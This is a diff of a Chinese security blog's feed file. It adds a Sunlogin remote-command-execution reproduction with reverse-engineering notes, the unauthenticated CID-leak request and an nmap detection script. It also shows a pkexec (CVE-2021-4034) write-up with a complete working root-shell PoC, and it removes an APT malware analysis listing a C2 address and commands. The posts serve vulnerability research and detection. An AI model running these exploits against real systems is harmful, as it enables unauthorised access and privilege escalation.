@@ -6,7 +6,7 @@
   <link href="http://422926799.github.io/atom.xml" rel="self"/>
   
   <link href="http://422926799.github.io/"/>
-  <updated>2022-01-28T09:17:37.997Z</updated>
+  <updated>2022-02-17T15:59:21.328Z</updated>
   <id>http://422926799.github.io/</id>
   
   <author>
@@ -17,11 +17,34 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>向日葵RCE漏洞复现分析</title>
+    <link href="http://422926799.github.io/posts/c5ac22a4.html"/>
+    <id>http://422926799.github.io/posts/c5ac22a4.html</id>
+    <published>2022-02-17T15:45:27.000Z</published>
+    <updated>2022-02-17T15:59:21.328Z</updated>
+    
+    <content type="html"><![CDATA[<p>复现基本参考：space老哥的《向日葵远程命令执行漏洞分析》</p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>漏洞范围：小于或等于11.x<br>复现的版本：11.0.0.33162<br><img src="https://s4.ax1x.com/2022/02/17/HIjjRU.png" alt=""></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>这里跟踪了check接口、路由接口、认证接口这三个<br>首先脱壳，向日葵加了UPX，upx -d脱掉即可<br><img src="https://s4.ax1x.com/2022/02/17/HIvCZR.png" alt=""></p><p>向日葵对应的端口，找到SunloginService服务的PID在找端口即可<br><img src="https://s4.ax1x.com/2022/02/17/HIviIx.png" alt=""></p><p>向日葵在启动的时候会开启该服务，端口绑定在服务里（没更）。向日葵的端口大概是<strong>4w-5w</strong><br><img src="https://s4.ax1x.com/2022/02/17/HIvERO.png" alt=""></p><p>根据PDF里的先获取CID才能后续利用，open IDA shift+F12搜索CID<br><img src="https://s4.ax1x.com/2022/02/17/HIveQe.png" alt=""></p><p>（先连接一次向日葵然后在log里可以看到CID，对应log位置：SunloginClient\log\sunlogin_service.&lt;日期&gt;.log）<br><img src="https://s4.ax1x.com/2022/02/17/HIv1FP.png" alt=""></p><p>根据PDF里的访问/cgi-bin/rpc可以未授权获取到CID。找到路由可以看到对应的处理函数(sub_140E216BA-&gt;找到该函数的方法上面提到的搜索CID字符串跟入其中一个函数在上级便是路由)<br>（懒得截图了，处理函数是sub_140E1C954）<br><img src="https://s4.ax1x.com/2022/02/17/HIvJSS.png" alt=""></p><p>当满足action=verify-haras会返回verify_string而和CID对比两者一致<br><img src="https://s4.ax1x.com/2022/02/17/HIvaes.png" alt=""><br><img src="https://s4.ax1x.com/2022/02/17/HIvBF0.png" alt=""></p><p>当为action为fast-login，是识别码和本地验证码的处理，认证成功后也可以获取CID<br><img src="https://s4.ax1x.com/2022/02/17/HIvrWT.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIvcy4.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIv5Y6.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIx64P.png" alt=""></p><p>参数需要:action=fast-login&amp;fastcode=&lt;本地识别码&gt;&amp;verify_string=&lt;本地验证码&gt;&amp;use_custom_password=1<br><img src="https://s4.ax1x.com/2022/02/17/HIxRgS.png" alt=""></p><p>也可以通过login.cgi验证获取CID<br><img src="https://s4.ax1x.com/2022/02/17/HIzpU1.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIzPC6.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIzi8K.png" alt=""></p><p><strong>check接口RCE</strong><br>获取cmd值后，判断是否存在ping命令然后跳到LABEL_27，调用sub_140E20B64执行命令<br><img src="https://s4.ax1x.com/2022/02/17/HIzVDH.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIztVs.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIzdP0.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIzBxU.png" alt=""></p><p><strong>认证接口</strong><br>回到路由，跟踪上一级（或者搜索:{“success”:false,”msg”:”Verification failure”}定位）<br><img src="https://s4.ax1x.com/2022/02/17/HIzgaR.png" alt=""></p><p>可以看到判断cookie是否存在和CID的赋值，最后传入v132判断CID是否正确<br><img src="https://s4.ax1x.com/2022/02/17/HIzWPx.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIzHZd.png" alt=""></p><p>如果是请求路径是下面其中一个则会进入到sub_14061D284（也就是刚刚的路由）<br><img src="https://s4.ax1x.com/2022/02/17/HIzXJP.png" alt=""></p><p>nmap检测脚本：</p><pre><code class="lua">local http=require &quot;http&quot;local shortport=require &quot;shortport&quot;local stdnse=require &quot;stdnse&quot;local string=require &quot;string&quot;local vulns=require &quot;vulns&quot;local json=require &quot;json&quot;portrule=function(host,port)        if (port.state==&quot;open&quot;) and (port.protocol==&quot;tcp&quot;) then                return true        endendaction=function(host,port)        local status=stdnse.output_table()        local url=string.format(&quot;http://%s:%s&quot;,host.ip,port.number)        local banner=&quot;{\&quot;success\&quot;:false,\&quot;msg\&quot;:\&quot;Verification failure\&quot;}&quot;        local headers={header={}}        headers[&quot;header&quot;][&quot;User-Agent&quot;]=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&quot;        local rqt=http.get_url(url,headers)        if (rqt.status==200) and (string.match(rqt.body,banner)) then                status.banner=&quot;SunloginClient&quot;                local uri=&quot;/cgi-bin/rpc&quot;                local postdata=&quot;action=verify-haras&quot;                local cid_check=http.post(host,port,uri,nil,true,postdata)                if(cid_check.status==200) then                        local json_check,json_data=json.parse(cid_check.body)                        if (json_data[&quot;enabled&quot;]==&quot;1&quot;) then                                status.rce=&quot;YES&quot;                                status.cid=json_data[&quot;verify_string&quot;]                        end                end                if (status~=nil) then                        return status                end        endend</code></pre><p><img src="https://s4.ax1x.com/2022/02/17/HoSpLQ.png" alt=""></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;复现基本参考：space老哥的《向日葵远程命令执行漏洞分析》&lt;/p&gt;
+&lt;h2 id=&quot;复现环境&quot;&gt;&lt;a href=&quot;#复现环境&quot; class=&quot;headerlink&quot; title=&quot;复现环境&quot;&gt;&lt;/a&gt;复现环境&lt;/h2&gt;&lt;p&gt;漏洞范围：小于或等于11.x&lt;br&gt;复现的版本：</summary>
+      
+    
+    
+    
+    
+    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
+    
+  </entry>
+  
+  <entry>
     <title>pkexec提权漏洞复现</title>
     <link href="http://422926799.github.io/posts/2b1cd54.html"/>
     <id>http://422926799.github.io/posts/2b1cd54.html</id>
     <published>2022-01-28T09:04:55.000Z</published>
-    <updated>2022-01-28T09:17:37.997Z</updated>
+    <updated>2022-01-28T09:21:00.858Z</updated>
     
     <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>2022-01-25，CVE-2021-4034利用详情发布，该漏洞是Qualys研究团队在polkit的pkexec中发现的一个内存损坏漏洞，允许非特权用户获取root权限。根据作者的发布文章说，在默认安装的Ubuntu、Debian、Fedora和CentOS上都已经成功复现。这个漏洞已经隐藏了12年多，并影响自2009年5月第一个版本以来的所有pkexec版本：（commit c8c3d83，“Add a pkexec(1) command”）<br><img src="https://s4.ax1x.com/2022/01/28/7x4Dte.png" alt=""></p><h2 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h2><p>1.存在pkexec命令<br>2.pkexec在suid里<br><img src="https://s4.ax1x.com/2022/01/28/7x5q8H.png" alt=""></p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>全”环境变量（例如 LD_PRELOAD）放在 pkexec 的 环境; 如果是正常设置环境变量，这些“不安全”变量通常会被删除（通过 ld.so），如GCONV_PATH就是不安全的环境变量，因为他会导致任意so执行。同时pkexec是一个默认具有suid<br>属性的程序，如果能让其执⾏命令，那么就能导致suid提权了。所以利⽤中允许我们绕过过滤写⼊GCONV_PATH，然后设置gconv-modules文件，触发字符集转换，调用iconv_open加载对应字符集的so文件。</p><p>534行：for循环argc=0，所以不会进入循环，但n已经设置成1<br>610行：argv[1]赋值给path<br><img src="https://s4.ax1x.com/2022/01/28/7xIBzd.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/28/7xIrQA.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/28/7xIfJg.png" alt=""></p><p>因为argv和envp指针在内存中是连续的，如果argc为0，那么越界argv[1]实际上是envp[0]<br><img src="https://s4.ax1x.com/2022/01/28/7xIbwV.png" alt=""></p><p>如果按照上面的代码逻辑，如果传⼊的命令不是绝对路径，就会在 PATH 环境变量的目录搜索，在赋<br>值回argv</p><p>假设我们执行pkexec，此时argc=0，envp={“xxx”}<br>610行，程序会读取argv[1]到path变量中，也就是”xxx”<br>632行，s = g_find_program_in_path (path)找到该程序的绝对路径，假设为/usr/bin/xxx<br>639行，程序将s写入argv[1]和path，从而覆盖了第一个环境变量。此时envp也就变成了{“/usr/bin/xxx”}<br><img src="https://s4.ax1x.com/2022/01/28/7xoAYD.png" alt=""></p><p>根据找到的函数进行寻找利用：<br>在pkexec中多次使用了g_printerr()函数，该函数是调用GLib的函数。但是如果环境变量CHARSET不是UTF-8，g_printerr()将会调用glibc的函数iconv_open()，来将消息从UTF-8转换为另一种格式。<br>iconv_open函数的执行过程为：iconv_open函数首先会找到系统提供的gconv-modules配置文件，这个文件中包含了各个字符集的相关信息存储的路径，每个字符集的相关信息存储在一个.so文件中，即gconv-modules文件提供了各个字符集的.so文件所在位置，之后会调用.so文件中的gconv()与gonv_init()函数。<br>如果我们改变了系统的GCONV_PATH环境变量，也就能改变gconv-modules配置文件的位置，从而执行一个恶意的so文件实现任意命令执行。</p><p><strong>argv[n] = path=s就能重新触发环境变量加载，因为g_printerr()将会调用glibc的函数iconv_open()利用环境变量重新定义了GCONV_PATH，最后找到自己定义的so。加载了gconv_init函数，最后由于又是SUID权限实现了提权其实就是类似于DLL劫持</strong></p><p>CVE-2021-4034</p><pre><code class="c">/** Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) by Andris Raugulis &lt;moo@arthepsy.eu&gt;* Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;char *shell =    &quot;#include &lt;stdio.h&gt;\n&quot;    &quot;#include &lt;stdlib.h&gt;\n&quot;    &quot;#include &lt;unistd.h&gt;\n\n&quot;    &quot;void gconv() {}\n&quot;    &quot;void gconv_init() {\n&quot;    &quot;    setuid(0); setgid(0);\n&quot;    &quot;    seteuid(0); setegid(0);\n&quot;    &quot;    system(\&quot;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf &#39;GCONV_PATH=.&#39; &#39;pwnkit&#39;; /bin/sh\&quot;);\n&quot;    &quot;    exit(0);\n&quot;    &quot;}&quot;;int main(int argc, char *argv[]) {    FILE *fp;    system(&quot;mkdir -p &#39;GCONV_PATH=.&#39;; touch &#39;GCONV_PATH=./pwnkit&#39;; chmod a+x &#39;GCONV_PATH=./pwnkit&#39;&quot;);    system(&quot;mkdir -p pwnkit; echo &#39;module UTF-8// PWNKIT// pwnkit 2&#39; &gt; pwnkit/gconv-modules&quot;);    fp = fopen(&quot;pwnkit/pwnkit.c&quot;, &quot;w&quot;);    fprintf(fp, &quot;%s&quot;, shell);    fclose(fp);    system(&quot;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&quot;);    char *env[] = { &quot;pwnkit&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;CHARSET=PWNKIT&quot;, &quot;SHELL=pwnkit&quot;, NULL };    execve(&quot;/usr/bin/pkexec&quot;, (char*[]){NULL}, env);}</code></pre><p><img src="https://s4.ax1x.com/2022/01/28/7xo3tS.png" alt=""></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>新版pkexec已修复了漏洞 (更新pkexec)<br><img src="https://s4.ax1x.com/2022/01/28/7xot6s.png" alt=""></li><li>取消pkexec SUID权限</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://saucer-man.com/information_security/876.html" target="_blank" rel="noopener">https://saucer-man.com/information_security/876.html</a></p>]]></content>
     
@@ -442,28 +465,6 @@
     
     
     <category term="域渗透" scheme="http://422926799.github.io/tags/域渗透/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>透明部落近期利用印度国防部会议记录为诱饵的攻击活动分析</title>
-    <link href="http://422926799.github.io/posts/2e79283e.html"/>
-    <id>http://422926799.github.io/posts/2e79283e.html</id>
-    <published>2021-08-06T17:44:09.000Z</published>
-    <updated>2021-08-06T17:56:18.868Z</updated>
-    
-    <content type="html"><![CDATA[<p>原文链接：<br><a href="https://mp.weixin.qq.com/s/3Je-DmyQrqNHxzRo70FTJw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/3Je-DmyQrqNHxzRo70FTJw</a></p><p>微步沙箱：<a href="https://s.threatbook.cn/report/file/8554b5cace52a0fdf0fd3378e4df6606efb45b8ee686ed5b3c1657633405eb85/?sign=history&amp;env=win7_sp1_enx86_office2013" target="_blank" rel="noopener">https://s.threatbook.cn/report/file/8554b5cace52a0fdf0fd3378e4df6606efb45b8ee686ed5b3c1657633405eb85/?sign=history&amp;env=win7_sp1_enx86_office2013</a><br>md5:7f1f7c5c4b6b486e5ba9340944036285<br><img src="https://z3.ax1x.com/2021/08/07/fuOagU.png" alt=""></p><p>执行恶意VBA分析<br>（先调用shoby_leLedr函数）<br><img src="https://z3.ax1x.com/2021/08/07/fuOBDJ.png" alt=""></p><p>释放C:\ProgramData\HDM Media\davivthain.exe和诱饵文件<br><img src="https://z3.ax1x.com/2021/08/07/fuODb9.png" alt=""></p><p>诱饵文件写入<br><img src="https://z3.ax1x.com/2021/08/07/fuOyU1.png" alt=""></p><p>davivthain.exe<br>md5:3c2b45a6d878cc9f30a5dc10abf400a1</p><blockquote><p>检查是否存在C:\Users\geyixian\AppData\Roaming\Microsoft\Windows\Templates\dihakhvartik.zip，存在则将其进行解压并执行<br><img src="https://z3.ax1x.com/2021/08/07/fuOgC6.png" alt=""></p></blockquote><p>若C:\Users\geyixian\AppData\Roaming\Microsoft\Windows\Templates\dihakhvartik.zip不存在，则将创建C:\ProgramData\Hithviwia目录，并通过getWin()函数读取资源数据，并根据操作系统版本选择相应内容保存为trbgertrnion.zip文件，解压执行<br><img src="https://z3.ax1x.com/2021/08/07/fuORgO.png" alt=""></p><p>getShin函数<br>获取操作系统版本，判断“wia07”和“wia08”文件是否存在，若存在则将其删除，然后从资源文件“Resources.data”读取数据保存为data.zip，并解压到C:\Users\geyixian\AppData\Roaming\Microsoft\Windows\Templates，再根据操作系统版本读取相应的文件内容。<br><img src="https://z3.ax1x.com/2021/08/07/fuOWvD.png" alt=""></p><p>drmaiprave.exe<br>md5:77c29d464efcae961424ae050453ef11<br>首先设置开机自启<br><img src="https://z3.ax1x.com/2021/08/07/fuOhKe.png" alt=""></p><p>完成初始化操作之后便开始与C2通信<br>（C2 IP:66.154.112.206 PORT:6188，如果端口连接失败从数组元素挨个测试）<br><img src="https://z3.ax1x.com/2021/08/07/fuO4DH.png" alt=""></p><p>IP解码<br><img src="https://z3.ax1x.com/2021/08/07/fuO5bd.png" alt=""><br><img src="https://z3.ax1x.com/2021/08/07/fuOoVA.png" alt=""></p><p>c2对应的指令解析<br><img src="https://z3.ax1x.com/2021/08/07/fuO75t.png" alt=""></p><p>c2指令   对应函数       操作<br>gey7tavs machine_procss 进程枚举<br>thy7umb  images_details GIF录制<br>pry7ocl  save_apps      开机自启注册表添加<br>doy7wf   download_file  文件保存<br>scy7rsz  dsk_scrn_size  设置截屏大小<br>fiy7lsz     ile_details    文件详情获取<br>csy7dcrgn seye_scren    屏幕截图<br>diy7rs    show_send_drives 硬盘数量枚举<br>dey7lt    tras_files     文件删除<br>afy7ile   seynd_auto    文件上传<br>udy7lt    remove_account 当前路径保存名为iaknhan.exe并运行<br>liy7stf   see_folders   文件夹遍历获取目录下的文件名（包括文件详细信息获取）<br>iny7fo    account_infos 系统版本号和当前进程所在路径获取<br>ruy7nf    Process.Start(procss_type[1].Split(new char[]{‘&gt;’})[0]);  运行指定进程<br>fiy7le    move_files    文件移动<br>fly7es    see_files     文件夹遍历获取文件名</p><p><img src="https://z3.ax1x.com/2021/08/07/fuObPP.png" alt=""></p><p>原文链接：<br><a href="https://mp.weixin.qq.com/s/3Je-DmyQrqNHxzRo70FTJw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/3Je-DmyQrqNHxzRo70FTJw</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;原文链接：&lt;br&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/3Je-DmyQrqNHxzRo70FTJw&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.weixin.qq.com/s/3Je-DmyQrq</summary>
-      
-    
-    
-    
-    
-    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
     
   </entry>
   
